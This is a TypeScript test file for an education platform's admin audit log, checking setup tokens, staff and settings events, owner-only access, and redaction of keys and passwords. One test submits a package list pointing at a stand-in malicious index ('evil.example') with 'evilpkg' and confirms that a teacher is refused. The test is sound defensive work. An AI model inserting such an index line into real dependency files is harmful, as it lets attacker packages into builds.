/**
 * The staff audit log, the setup token after the claim, and who may write a
 * package list.
 *
 * A university's data-protection officer asks "who did what in the admin
 * panel", and until 0.9 nothing answered: a sign-in, a teacher removed, a room
 * deleted, a model key replaced left no trace. What is checked here is the
 * trace itself — one event per kind of staff action, written by the real
 * routes of the real app — and the door that reads it (owners only).
 *
 * The file starts on an unclaimed instance on purpose: its own database, no
 * staff. The first test claims it, exactly as an operator would, and checks
 * that the setup token that was printed dies at that moment.
 */
import './_env.mts'
import fs from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import express, { type Response as ExpressResponse } from 'express'
import { after, before, test } from 'node:test'
import assert from 'node:assert/strict'
import {
  ADMIN_AUDIT_ACTIONS,
  STAFF_COOKIE,
  type AdminAuditEvent,
  type AdminAuditPage,
  type Teacher,
  type TeacherWithLink,
} from '../shared/admin.js'
import { issueStaffCookie, readSetupToken, setupBanner, setupTokenPath, verifySetupToken } from '../server/src/admin/auth.js'
import { AUDIT_RETENTION_DAYS, listAdminEvents, pruneAdminEvents, recordAdminEvent } from '../server/src/admin/audit-log.js'
import { createTeacher, getTeacherByEmail, rotateLinkKey } from '../server/src/admin/store.js'
import { app } from '../server/src/app.js'
import { createSession, db } from '../server/src/db.js'
import { getSessionDoc, shutdownCollab } from '../server/src/collab/index.js'
import { writePublication } from '../server/src/publish/store.js'
import { addBook } from '../shared/notebook.js'
import { createCompetition, getCompetition, updateCompetition, updateSubmission } from '../server/src/competitions/store.js'
import { adminEnvironmentRoutes } from '../server/src/routes/admin-environments.js'
import { adminAuditRoutes } from '../server/src/routes/admin-audit.js'

/*
 * Package lists are written into COLLOQ_HOME/environments when it is set, and
 * into the repository's kernel/environments when it is not. The suite must not
 * write into the checkout it runs from.
 */
const home = fs.mkdtempSync(path.join(os.tmpdir(), 'colloq-audit-home-'))
process.env.COLLOQ_HOME = home

let base = ''
let server: http.Server
/** Build routes with a fake build: the real one goes to docker. */
let buildBase = ''
let buildServer: http.Server
let builds = 0

let owner: Teacher
let ownerCookie = ''
let teacherCookie = ''

function cookieFor(teacher: Teacher): string {
  let value = ''
  issueStaffCookie({ cookie: (_n: string, v: string) => (value = v) } as unknown as ExpressResponse, teacher)
  return `${STAFF_COOKIE}=${value}`
}

function call(
  method: string,
  url: string,
  init: { cookie?: string; body?: unknown; at?: string } = {},
): Promise<globalThis.Response> {
  return fetch(`${init.at ?? base}${url}`, {
    method,
    headers: { 'content-type': 'application/json', ...(init.cookie ? { cookie: init.cookie } : {}) },
    body: init.body === undefined ? undefined : JSON.stringify(init.body),
  })
}

function upload(url: string, cookie: string, files: { name: string; body: string }[]): Promise<globalThis.Response> {
  const form = new FormData()
  for (const file of files) form.append('file', new Blob([new TextEncoder().encode(file.body)]), file.name)
  return fetch(`${base}${url}`, { method: 'POST', headers: { cookie }, body: form })
}

/** Every event, newest first. */
function events(): AdminAuditEvent[] {
  return listAdminEvents({ limit: 200 }).events
}

/** The newest event of one kind, or a failure naming it. */
function last(action: string): AdminAuditEvent {
  const found = events().find((event) => event.action === action)
  assert.ok(found, `no "${action}" event was recorded`)
  return found
}

before(async () => {
  server = http.createServer(app)
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  base = `http://127.0.0.1:${(server.address() as { port: number }).port}`

  const buildApp = express()
  buildApp.use(express.json())
  buildApp.use(
    adminEnvironmentRoutes({
      environmentAbilities: () =>
        Promise.resolve({ canBuild: true, cannotBuildReason: null, canSetDefault: false, cannotSetDefaultReason: 'test' }),
      startBuild: () => {
        builds += 1
        return Promise.resolve()
      },
    }),
  )
  buildServer = http.createServer(buildApp)
  await new Promise<void>((resolve) => buildServer.listen(0, '127.0.0.1', resolve))
  buildBase = `http://127.0.0.1:${(buildServer.address() as { port: number }).port}`
})

after(() => {
  server?.close()
  buildServer?.close()
  shutdownCollab()
  fs.rmSync(home, { recursive: true, force: true })
})

/* ------------------------------------------------------ the setup token */

test('the printed setup token dies at the claim; the new one is never printed and still recovers', async () => {
  const printed = readSetupToken()
  const banner = setupBanner('http://class.example')
  assert.ok(banner?.includes(`http://class.example/admin/t/${printed}`), 'an unclaimed instance did not print its way in')

  const claimed = await call('POST', '/api/admin/claim', {
    body: { token: printed, name: 'Ада Лавлейс', email: 'ada.audit@example.edu' },
  })
  assert.equal(claimed.status, 201)
  owner = getTeacherByEmail('ada.audit@example.edu')!
  assert.ok(owner)
  ownerCookie = cookieFor(owner)

  // The printed one no longer signs anyone in, by any door.
  assert.equal(verifySetupToken(printed), false)
  const withPrinted = await call('POST', '/api/admin/signin/token', { body: { token: printed } })
  assert.equal(withPrinted.status, 401)

  // A fresh one replaced it, in the file only — and nothing prints it any more.
  const fresh = readSetupToken()
  assert.notEqual(fresh, printed)
  assert.equal(fs.readFileSync(setupTokenPath, 'utf8').trim(), fresh)
  assert.equal(fs.statSync(setupTokenPath).mode & 0o777, 0o600)
  assert.equal(setupBanner('http://class.example'), null)

  // The file is the recovery path: whoever can read the server's disk gets back in.
  const recovered = await call('POST', '/api/admin/signin/token', { body: { token: fresh } })
  assert.equal(recovered.status, 200)
  // And a second claim is closed, with any token.
  const again = await call('POST', '/api/admin/claim', { body: { token: fresh, name: 'X', email: 'x.audit@example.edu' } })
  assert.equal(again.status, 409)

  const claim = last('instance.claimed')
  assert.equal(claim.actor?.id, owner.id)
  assert.equal(claim.actor?.email, 'ada.audit@example.edu')
  assert.equal(claim.target?.id, owner.id)
  assert.ok(claim.ip, 'the claim did not keep the address it came from')
  const recovery = last('staff.signed_in')
  assert.deepEqual(recovery.detail, { via: 'setup_token' })
  assert.equal(recovery.actor?.id, owner.id)
})

/* --------------------------------------------------------- staff actions */

test('every change to the staff list and every sign-in is recorded, with who and to whom', async () => {
  const added = await call('POST', '/api/admin/teachers', {
    cookie: ownerCookie,
    body: { name: 'Нина Петрова', email: 'nina.audit@example.edu' },
  })
  assert.equal(added.status, 201)
  const { teacher, signInUrl } = (await added.json()) as TeacherWithLink
  const add = last('staff.added')
  assert.equal(add.actor?.id, owner.id)
  assert.deepEqual(add.target, { type: 'staff', id: teacher.id, label: 'Нина Петрова' })
  assert.deepEqual(add.detail, { email: 'nina.audit@example.edu', role: 'teacher' })

  // She signs in with her link.
  const key = signInUrl.slice(signInUrl.lastIndexOf('/') + 1)
  const signIn = await call('POST', '/api/admin/signin/key', { body: { key } })
  assert.equal(signIn.status, 200)
  const signed = last('staff.signed_in')
  assert.equal(signed.actor?.id, teacher.id)
  assert.deepEqual(signed.detail, { via: 'link' })

  assert.equal((await call('GET', `/api/admin/teachers/${teacher.id}/link`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('staff.link_copied').target?.id, teacher.id)

  assert.equal((await call('POST', `/api/admin/teachers/${teacher.id}/rotate`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('staff.link_rotated').target?.id, teacher.id)

  const renamed = await call('PATCH', `/api/admin/teachers/${teacher.id}`, {
    cookie: ownerCookie,
    body: { name: 'Нина Сидорова' },
  })
  assert.equal(renamed.status, 200)
  assert.deepEqual(last('staff.identity_changed').detail, { name: 'Нина Сидорова', previousName: 'Нина Петрова' })

  const promoted = await call('PATCH', `/api/admin/teachers/${teacher.id}`, { cookie: ownerCookie, body: { role: 'owner' } })
  assert.equal(promoted.status, 200)
  assert.deepEqual(last('staff.role_changed').detail, { from: 'teacher', to: 'owner' })

  // A save that changes nothing leaves nothing: the log is of what happened.
  const before = events().length
  await call('PATCH', `/api/admin/teachers/${teacher.id}`, { cookie: ownerCookie, body: { role: 'owner' } })
  assert.equal(events().length, before)

  assert.equal((await call('DELETE', `/api/admin/teachers/${teacher.id}`, { cookie: ownerCookie })).status, 204)
  const removed = last('staff.removed')
  assert.equal(removed.target?.label, 'Нина Сидорова')
  assert.deepEqual(removed.detail, { email: 'nina.audit@example.edu', role: 'owner' })

  // A refused attempt is not an event.
  const count = events().length
  assert.equal((await call('POST', '/api/admin/signin/key', { body: { key: 'nope' } })).status, 401)
  assert.equal(events().length, count)

  const rotated = await call('POST', '/api/admin/setup-token/rotate', { cookie: ownerCookie })
  assert.equal(rotated.status, 200)
  const { token } = (await rotated.json()) as { token: string }
  const rotation = last('setup_token.rotated')
  assert.equal(rotation.actor?.id, owner.id)
  // The new token itself is nowhere in the log.
  assert.equal(JSON.stringify(events()).includes(token), false)
})

/* ------------------------------------------------ rooms, courses, pages */

test('creating a room and changing who teaches a course or a room are recorded', async () => {
  const lena = createTeacher({ name: 'Лена Кузнецова', email: 'lena.audit@example.edu', role: 'teacher' })!
  rotateLinkKey(lena.id)

  const made = await call('POST', '/api/admin/seminars', { cookie: ownerCookie, body: { name: 'Аудит: занятие' } })
  assert.equal(made.status, 201)
  const { id: room } = (await made.json()) as { id: string }
  const created = last('room.created')
  assert.deepEqual(created.target, { type: 'room', id: room, label: 'Аудит: занятие' })
  assert.equal(created.actor?.id, owner.id)

  assert.equal((await call('POST', `/api/admin/seminars/${room}/teachers`, { cookie: ownerCookie, body: { staffId: lena.id } })).status, 201)
  assert.equal(last('room.teacher_added').detail?.staff, lena.id)
  assert.equal((await call('DELETE', `/api/admin/seminars/${room}/teachers/${lena.id}`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('room.teacher_removed').detail?.staff, lena.id)

  const course = await call('POST', '/api/admin/courses', { cookie: ownerCookie, body: { name: 'Аудит: курс' } })
  const { course: { id: courseId } } = (await course.json()) as { course: { id: string } }
  assert.equal((await call('POST', `/api/admin/courses/${courseId}/teachers`, { cookie: ownerCookie, body: { staffId: lena.id } })).status, 201)
  const added = last('course.teacher_added')
  assert.deepEqual([added.target?.id, added.detail?.staff], [courseId, lena.id])
  assert.equal((await call('DELETE', `/api/admin/courses/${courseId}/teachers/${lena.id}`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('course.teacher_removed').detail?.staff, lena.id)
})

test('deleting a room, making and deleting a course and every change of a public page are recorded', async () => {
  createSession('auditroom', 'Семинар 7', null)
  assert.equal((await call('DELETE', '/api/admin/seminars/auditroom', { cookie: ownerCookie })).status, 204)
  const room = last('room.deleted')
  assert.deepEqual(room.target, { type: 'room', id: 'auditroom', label: 'Семинар 7' })
  assert.equal(room.actor?.id, owner.id)

  const made = await call('POST', '/api/admin/courses', { cookie: ownerCookie, body: { name: 'Матстат' } })
  assert.equal(made.status, 200)
  const { course } = (await made.json()) as { course: { id: string } }
  assert.deepEqual(last('course.created').target, { type: 'course', id: course.id, label: 'Матстат' })
  assert.equal((await call('DELETE', `/api/admin/courses/${course.id}`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('course.deleted').target?.id, course.id)

  createSession('auditpage', 'Разбор', null)
  const homework = addBook(getSessionDoc('auditpage').doc, 'homework.ipynb').root
  const published = await call('POST', '/api/admin/seminars/auditpage/publish', {
    cookie: ownerCookie,
    body: {
      notebooks: [
        { root: 'cells', name: 'Тетрадь' },
        { root: homework, name: 'Домашнее задание' },
      ],
      files: [],
      ack: [],
    },
  })
  assert.equal(published.status, 200)
  const { page: publication } = (await published.json()) as {
    page: { id: string; materials: { key: string }[] }
  }
  const publish = last('publication.published')
  assert.equal(publish.target?.id, publication.id)
  assert.equal(publish.detail?.room, 'auditpage')
  assert.equal(publish.detail?.materials, 2)
  assert.equal(publish.detail?.trigger, 'teacher')

  // One material taken off the page is a change of a public page too.
  const key = publication.materials[1].key
  const removed = await call('DELETE', `/api/admin/publications/${publication.id}/materials/${key}`, {
    cookie: ownerCookie,
  })
  assert.equal(removed.status, 200)
  const taken = last('publication.material_removed')
  assert.equal(taken.target?.id, publication.id)
  assert.equal(taken.detail?.material, 'Домашнее задание')

  // Who reaches the room behind the page from its link is a staff decision too.
  const narrowed = await call('PATCH', `/api/admin/publications/${publication.id}`, {
    cookie: ownerCookie,
    body: { roomAccess: 'members' },
  })
  assert.equal(narrowed.status, 200)
  const door = last('publication.room_access')
  assert.equal(door.target?.id, publication.id)
  const { access, was, room: doorRoom } = door.detail ?? {}
  assert.deepEqual([access, was, doorRoom], ['members', 'anyone', 'auditpage'])

  assert.equal((await call('DELETE', '/api/admin/seminars/auditpage/publish', { cookie: ownerCookie })).status, 200)
  assert.equal(last('publication.withdrawn').target?.id, publication.id)
  assert.equal((await call('POST', `/api/admin/publications/${publication.id}/restore`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('publication.restored').target?.id, publication.id)

  createSession('auditgone', 'Старый разбор', null)
  const doomed = writePublication({ sessionId: 'auditgone', title: 'Старый разбор', by: null, materials: [], blobs: [] })
  assert.equal((await call('DELETE', `/api/admin/publications/${doomed.id}/forever`, { cookie: ownerCookie })).status, 200)
  const erased = last('publication.deleted')
  assert.deepEqual(erased.target, { type: 'publication', id: doomed.id, label: 'Старый разбор' })
})

/* ----------------------------------------------------------- competitions */

test('a competition’s creation, opening, closing and deletion are recorded', async () => {
  const made = await call('POST', '/api/admin/competitions', {
    cookie: ownerCookie,
    body: { slug: 'audit-orders', title: 'Сколько заказов' },
  })
  assert.equal(made.status, 201)
  const created = last('competition.created')
  const id = created.target!.id!
  assert.equal(created.target?.label, 'Сколько заказов')
  assert.equal(created.detail?.slug, 'audit-orders')

  // Ready to open: data, answers, metric, a checked baseline and a deadline.
  assert.equal((await upload(`/api/admin/competitions/${id}/files`, ownerCookie, [{ name: 'test.csv', body: 'id,y\n1,5\n2,7\n' }])).status, 200)
  assert.equal((await upload(`/api/admin/competitions/${id}/solution`, ownerCookie, [{ name: 'a.csv', body: 'id,y\n1,5\n2,7\n' }])).status, 200)
  assert.equal(
    (
      await call('PUT', `/api/admin/competitions/${id}/metric`, {
        cookie: ownerCookie,
        body: { name: 'RMSE', direction: 'lower', code: 'def score(solution, submission): return 0.0' },
      })
    ).status,
    200,
  )
  const notebook = JSON.stringify({ nbformat: 4, cells: [{ cell_type: 'code', source: 'pass' }] })
  assert.equal((await upload(`/api/admin/competitions/${id}/baseline`, ownerCookie, [{ name: 'b.ipynb', body: notebook }])).status, 200)
  const check = await call('POST', `/api/admin/competitions/${id}/baseline/check`, { cookie: ownerCookie })
  assert.equal(check.status, 202)
  const { submissionId } = (await check.json()) as { submissionId: string }
  updateSubmission(submissionId, { state: 'scored', publicScore: 0.1, privateScore: 0.1 })
  updateCompetition(id, { deadlineAt: Date.now() + 86_400_000 })

  assert.equal((await call('POST', `/api/admin/competitions/${id}/open`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('competition.opened').target?.id, id)
  assert.equal((await call('POST', `/api/admin/competitions/${id}/finish`, { cookie: ownerCookie })).status, 200)
  assert.equal(last('competition.closed').target?.id, id)
  assert.equal((await call('DELETE', `/api/admin/competitions/${id}`, { cookie: ownerCookie })).status, 204)
  assert.equal(last('competition.deleted').target?.id, id)
  assert.equal(getCompetition(id), null)
})

/* ------------------------------------------------------------- settings */

test('settings changes are recorded, and the model key never is', async () => {
  const secret = 'sk-audit-do-not-store-0123456789'
  const saved = await call('PUT', '/api/admin/oracle', {
    cookie: ownerCookie,
    body: { apiKey: secret, model: 'audit-model', sendNames: false, houseRules: 'Без pandas.' },
  })
  assert.equal(saved.status, 200)
  const oracle = last('settings.oracle_changed')
  assert.deepEqual(oracle.detail, { apiKey: 'set', model: 'audit-model', sendNames: false, houseRules: 'changed' })
  const cleared = await call('PUT', '/api/admin/oracle', { cookie: ownerCookie, body: { apiKey: '', sendNames: true } })
  assert.equal(cleared.status, 200)
  assert.deepEqual(last('settings.oracle_changed').detail, { apiKey: 'cleared', sendNames: true })
  // A password written into an endpoint's address is a secret too.
  const endpoint = await call('PUT', '/api/admin/oracle', { cookie: ownerCookie, body: { baseUrl: 'https://svc:p4ssw0rd@llm.example/v1' } })
  assert.equal(endpoint.status, 200)
  assert.deepEqual(last('settings.oracle_changed').detail, { baseUrl: 'https://***@llm.example/v1' })
  // Not in the events, and not anywhere in the table either.
  const table = JSON.stringify(db.prepare('SELECT * FROM admin_audit_log').all())
  assert.equal(table.includes(secret), false, 'the model key reached the audit log')
  assert.equal(table.includes('p4ssw0rd'), false, 'a password in the endpoint address reached the audit log')

  const resources = await call('PUT', '/api/admin/resources', { cookie: ownerCookie, body: { ownMax: 7 } })
  assert.equal(resources.status, 200)
  const resource = last('settings.resources_changed')
  assert.deepEqual(resource.detail, { changed: ['ownMax'], ownMax: 7 })
  await call('PUT', '/api/admin/resources', { cookie: ownerCookie, body: { ownMax: null } })

  const slots = await call('PUT', '/api/admin/competitions/settings', { cookie: ownerCookie, body: { slots: 'auto' } })
  assert.equal(slots.status, 200)
  assert.deepEqual(last('settings.competitions_changed').detail, { changed: ['slots'] })

  const english = await call('PATCH', '/api/admin/instance/settings', { cookie: ownerCookie, body: { language: 'en' } })
  assert.equal(english.status, 200)
  // Back at once: the rest of the file reads Russian words.
  await call('PATCH', '/api/admin/instance/settings', { cookie: ownerCookie, body: { language: 'ru' } })
  const language = events().filter((event) => event.action === 'settings.instance_changed')
  assert.deepEqual(
    language.map((event) => event.detail),
    [
      { language: 'ru', previousLanguage: 'en' },
      { language: 'en', previousLanguage: 'ru' },
    ],
  )
})

/* ------------------------------------------------------------ environments */

test('a teacher cannot create, edit or delete a package list; the owner can, and each write is recorded', async () => {
  const nina = createTeacher({ name: 'Нина Орлова', email: 'nina.env@example.edu', role: 'teacher' })!
  rotateLinkKey(nina.id)
  teacherCookie = cookieFor(nina)
  const list = path.join(home, 'environments', 'audit-env.txt')

  const refused = await call('PUT', '/api/admin/environments/audit-env', {
    cookie: teacherCookie,
    body: { source: '--extra-index-url https://evil.example/simple\nevilpkg\n' },
  })
  assert.equal(refused.status, 403)
  const why = (await refused.json()) as { reason: string; error: string }
  assert.equal(why.reason, 'forbidden')
  assert.match(why.error, /списки пакетов|package lists/)
  assert.equal(fs.existsSync(list), false, "a teacher's list reached the disk")

  // Reading stays open to every teacher: they choose environments for their classes.
  assert.equal((await call('GET', '/api/admin/environments', { cookie: teacherCookie })).status, 200)
  assert.equal((await call('GET', '/api/admin/environments/base', { cookie: teacherCookie })).status, 200)

  const created = await call('PUT', '/api/admin/environments/audit-env', {
    cookie: ownerCookie,
    body: { source: '# colloq: parent base\n--extra-index-url https://ci:hunter2@pypi.internal.example/simple\npolars\n' },
  })
  assert.equal(created.status, 200)
  assert.equal(fs.existsSync(list), true)
  const create = last('environment.created')
  assert.deepEqual(create.target, { type: 'environment', id: 'audit-env', label: 'audit-env' })
  assert.deepEqual(create.detail, {
    added: ['# colloq: parent base', '--extra-index-url https://***@pypi.internal.example/simple', 'polars'],
  })
  assert.equal(JSON.stringify(events()).includes('hunter2'), false, 'a password in an index URL reached the log')

  const edited = await call('PUT', '/api/admin/environments/audit-env', {
    cookie: ownerCookie,
    body: { source: '# colloq: parent base\npolars\nduckdb\n' },
  })
  assert.equal(edited.status, 200)
  assert.deepEqual(last('environment.edited').detail, {
    added: ['duckdb'],
    removed: ['--extra-index-url https://***@pypi.internal.example/simple'],
  })

  const refusedDelete = await call('DELETE', '/api/admin/environments/audit-env', { cookie: teacherCookie })
  assert.equal(refusedDelete.status, 403)
  assert.equal((await call('DELETE', '/api/admin/environments/audit-env', { cookie: ownerCookie })).status, 204)
  assert.equal(last('environment.deleted').target?.id, 'audit-env')

  // A build stays the owner's too, and it is recorded when it starts.
  assert.equal((await call('POST', '/api/admin/environments/base/build', { cookie: teacherCookie, at: buildBase })).status, 403)
  assert.equal((await call('POST', '/api/admin/environments/base/build', { cookie: ownerCookie, at: buildBase })).status, 202)
  assert.equal(builds, 1)
  assert.equal(last('environment.built').target?.id, 'base')
})

/* ------------------------------------------------------------- the door */

test('only an owner reads the log, newest first, a page at a time', async () => {
  assert.equal((await call('GET', '/api/admin/audit-log')).status, 401)
  const refused = await call('GET', '/api/admin/audit-log', { cookie: teacherCookie })
  assert.equal(refused.status, 403)
  assert.match(((await refused.json()) as { error: string }).error, /журнал действий|audit log/)

  const first = await call('GET', '/api/admin/audit-log?limit=3', { cookie: ownerCookie })
  assert.equal(first.status, 200)
  assert.equal(first.headers.get('cache-control'), 'no-store')
  const page = (await first.json()) as AdminAuditPage
  assert.equal(page.events.length, 3)
  assert.equal(page.retentionDays, AUDIT_RETENTION_DAYS)
  assert.ok(page.events[0].id > page.events[1].id && page.events[1].id > page.events[2].id, 'not newest first')
  assert.equal(page.next, page.events[2].id)

  const second = (await (await call('GET', `/api/admin/audit-log?limit=3&before=${page.next}`, { cookie: ownerCookie })).json()) as AdminAuditPage
  assert.ok(second.events.every((event) => event.id < page.next!), 'the second page overlapped the first')

  // The last page says so: before the second-oldest event there is only the oldest.
  const all = listAdminEvents({ limit: 200 })
  assert.equal(all.next, null)
  const oldest = all.events.at(-1)!
  const lastPage = (await (await call('GET', `/api/admin/audit-log?before=${all.events.at(-2)!.id}`, { cookie: ownerCookie })).json()) as AdminAuditPage
  assert.deepEqual(lastPage.events.map((event) => event.id), [oldest.id])
  assert.equal(lastPage.next, null)
})

/* ----------------------------------------------------------- the table */

test('the log is append-only, keeps a year, and redacts what looks like a secret', () => {
  recordAdminEvent({ actor: owner, action: 'settings.oracle_changed', detail: { apiKey: 'sk-live-oops', token: 'replaced' } })
  const careless = last('settings.oracle_changed')
  assert.deepEqual(careless.detail, { apiKey: '[redacted]', token: 'replaced' })

  assert.throws(() => db.prepare('UPDATE admin_audit_log SET action = ? WHERE id = ?').run('x', careless.id), /append-only/)
  assert.throws(() => db.prepare('DELETE FROM admin_audit_log WHERE id = ?').run(careless.id), /keeps events/)

  // A row from thirteen months ago goes at the next pruning; a fresh one stays.
  const old = Date.now() - 400 * 24 * 60 * 60 * 1000
  db.prepare("INSERT INTO admin_audit_log (at, action) VALUES (?, 'course.created')").run(old)
  const oldId = (db.prepare('SELECT id FROM admin_audit_log WHERE at = ?').get(old) as { id: number }).id
  assert.equal(pruneAdminEvents(), 1)
  assert.equal(db.prepare('SELECT id FROM admin_audit_log WHERE id = ?').get(oldId), undefined)
  assert.ok(db.prepare('SELECT id FROM admin_audit_log WHERE id = ?').get(careless.id))
})

test('every kind of staff action is recorded somewhere', () => {
  const seen = new Set(events().map((event) => event.action))
  /*
   * Two are not driven through a route here. "Make default" writes the
   * host's .env and restarts a kernel, which this suite must not do; its
   * record call sits next to build's in the same file. The entrant deletion
   * route belongs to the competitions package and is wired to the log when
   * the packages are merged.
   */
  const source = fs.readFileSync(path.join(import.meta.dirname, '../server/src/routes/admin-environments.ts'), 'utf8')
  assert.match(source, /action: 'environment\.made_default'/)
  const notDriven = new Set(['environment.made_default', 'competition.entrant_deleted'])
  const missing = ADMIN_AUDIT_ACTIONS.filter((action) => !notDriven.has(action) && !seen.has(action))
  assert.deepEqual(missing, [])
})

test('the audit route is its own door, not borrowed from another router', async () => {
  // Mounted alone it still refuses a teacher: the check is on the route itself.
  const alone = express()
  alone.use(adminAuditRoutes())
  const server = http.createServer(alone)
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  try {
    const at = `http://127.0.0.1:${(server.address() as { port: number }).port}`
    assert.equal((await call('GET', '/api/admin/audit-log', { cookie: teacherCookie, at })).status, 403)
    assert.equal((await call('GET', '/api/admin/audit-log', { cookie: ownerCookie, at })).status, 200)
  } finally {
    server.close()
  }
})
